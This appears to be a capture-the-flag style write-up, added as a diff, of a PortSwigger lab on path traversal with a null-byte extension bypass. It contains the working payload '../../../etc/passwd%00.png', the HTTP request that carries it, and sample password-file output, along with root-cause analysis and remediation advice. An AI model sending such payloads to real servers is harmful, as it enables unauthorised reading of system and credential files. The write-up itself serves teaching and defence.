@@ -1,0 +1,259 @@
+# File Path Traversal with Null Byte Bypass
+
+## Lab Information
+
+| Field | Value |
+|-------|-------|
+| **Lab** | File path traversal with null byte bypass |
+| **Category** | Path Traversal / Directory Traversal |
+| **Severity** | High |
+| **CWE** | CWE-22 – Improper Limitation of a Pathname to a Restricted Directory |
+| **OWASP Top 10** | A01:2021 – Broken Access Control |
+
+---
+
+# Executive Summary
+
+The application was vulnerable to a **Path Traversal** vulnerability due to improper handling of **null byte (`%00`) injection**. Although the application attempted to enforce a `.png` extension on user-supplied filenames, it failed to sanitize null bytes before passing the path to the underlying filesystem.
+
+By injecting a URL-encoded null byte (`%00`) before the expected extension, it was possible to truncate the filename at the operating system level and access arbitrary files outside the intended directory.
+
+The vulnerability was successfully exploited to retrieve the contents of the Linux `/etc/passwd` file.
+
+---
+
+# Objective
+
+Retrieve the contents of:
+
+```text
+/etc/passwd
+```
+
+---
+
+# Vulnerability Discovery
+
+While browsing a product page, the application requested product images through the following endpoint:
+
+```http
+GET /image?filename=6.jpg HTTP/2
+Host: LAB-ID.web-security-academy.net
+```
+
+The application accepted only image files and appeared to require the `.png` extension.
+
+A classic Path Traversal payload such as:
+
+```text
+../../../etc/passwd
+```
+
+was not sufficient because the application expected an image filename.
+
+---
+
+# Exploitation
+
+A URL-encoded null byte (`%00`) was injected immediately before the required extension.
+
+Payload:
+
+```text
+../../../etc/passwd%00.png
+```
+
+Modified request:
+
+```http
+GET /image?filename=../../../etc/passwd%00.png HTTP/2
+Host: LAB-ID.web-security-academy.net
+```
+
+---
+
+# Result
+
+The server returned the contents of the Linux password file.
+
+Example:
+
+```text
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/usr/sbin:/usr/sbin/nologin
+...
+```
+
+The lab was automatically marked as solved after successfully retrieving the file.
+
+---
+
+# Technical Analysis
+
+The application attempted to restrict access to image files by requiring a `.png` extension.
+
+A simplified implementation could resemble:
+
+```php
+$filename = $_GET['filename'];
+
+readfile($filename);
+```
+
+or
+
+```php
+readfile($filename . ".png");
+```
+
+The supplied payload:
+
+```text
+../../../etc/passwd%00.png
+```
+
+is URL-decoded into:
+
+```text
+../../../etc/passwd\0.png
+```
+
+where `\0` represents the **null byte**.
+
+In vulnerable implementations, native filesystem functions written in C interpret the null byte as the end of the string.
+
+As a result, the operating system effectively receives:
+
+```text
+../../../etc/passwd
+```
+
+and ignores everything after the null byte:
+
+```text
+.png
+```
+
+---
+
+# Proof of Concept
+
+## Original Request
+
+```http
+GET /image?filename=6.jpg HTTP/2
+Host: LAB-ID.web-security-academy.net
+```
+
+## Malicious Request
+
+```http
+GET /image?filename=../../../etc/passwd%00.png HTTP/2
+Host: LAB-ID.web-security-academy.net
+```
+
+---
+
+# Root Cause
+
+The application validates the filename extension but does not sanitize or reject embedded null bytes before passing the path to the filesystem.
+
+Processing flow:
+
+```
+User Input
+
+../../../etc/passwd%00.png
+
+↓
+
+URL Decoding
+
+../../../etc/passwd\0.png
+
+↓
+
+Native Filesystem API
+
+../../../etc/passwd
+```
+
+The filesystem stops processing at the null byte, effectively bypassing the extension validation.
+
+---
+
+# Impact
+
+An attacker can exploit this vulnerability to:
+
+- Read arbitrary files from the server.
+- Access sensitive configuration files.
+- Retrieve source code.
+- Leak credentials, API keys, and secrets.
+- Gather information useful for privilege escalation.
+- Chain the vulnerability with additional attacks leading to Remote Code Execution.
+
+---
+
+# Why the Null Byte Works
+
+The injected payload:
+
+```
+../../../etc/passwd%00.png
+```
+
+becomes:
+
+```
+../../../etc/passwd\0.png
+                      ↑
+                  Null byte
+```
+
+Many legacy C-based filesystem APIs terminate strings at the first null byte.
+
+Therefore, the operating system interprets the filename as:
+
+```
+../../../etc/passwd
+```
+
+instead of:
+
+```
+../../../etc/passwd.png
+```
+
+---
+
+# Remediation
+
+To prevent null byte injection vulnerabilities:
+
+- Reject all null bytes (`\0`) in user input.
+- Canonicalize and validate file paths before accessing the filesystem.
+- Validate the resolved path instead of the raw input.
+- Avoid relying solely on filename extensions for security.
+- Use allowlists of permitted filenames or resource identifiers.
+- Keep runtime environments and language versions updated, as modern frameworks reject null bytes by default.
+
+---
+
+# References
+
+- PortSwigger Web Security Academy – Path Traversal
+- OWASP Path Traversal
+- CWE-22 – Improper Limitation of a Pathname to a Restricted Directory
+- CWE-158 – Improper Neutralization of Null Byte or NUL Character
+
+---
+
+# Key Takeaways
+
+This lab demonstrates how **null byte injection** can bypass filename validation mechanisms.
+
+Although the application expected an image file ending in `.png`, the injected null byte caused the underlying filesystem to truncate the string before the extension, allowing arbitrary file access.
+
+While modern programming languages and frameworks generally reject null bytes in file paths, this vulnerability remains relevant when auditing legacy applications, native extensions, or software built on C-based APIs.
